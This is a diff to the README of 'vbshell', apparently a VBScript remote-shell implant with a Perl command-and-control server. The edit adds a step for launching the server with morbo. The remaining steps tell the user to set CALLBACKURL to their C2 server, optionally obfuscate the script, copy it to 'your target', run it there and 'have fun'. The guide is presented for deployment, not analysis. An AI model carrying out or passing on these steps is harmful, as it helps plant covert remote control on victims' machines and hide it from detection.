@@ -14,13 +14,19 @@ cd vbshell
 cpanm --installdeps .
 ```
 
-2. Edit the vbshell.vbs file and change the value of CALLBACKURL to your C2 server's url
+2. Run the server using [Morbo](https://mojolicious.org/)
+
+```bash
+morbo -l http://*:3000 -m production server.pl #you might want to change the port 3000 to something else
+```
+
+3. Edit the vbshell.vbs file and change the value of CALLBACKURL to your C2 server's url
 
 ```vbscript
-CALLBACKURL = "https://my.server.tld"
+CALLBACKURL = "http://my.server.tld"
 ```
-3. Obfuscate the script somehow (optional)
+4. Obfuscate the script somehow (optional)
 
-4. Copy the vbshell.vbs file to your target and run it
+5. Copy the vbshell.vbs file to your target and run it
 
-5. Have fun
+6. Have fun
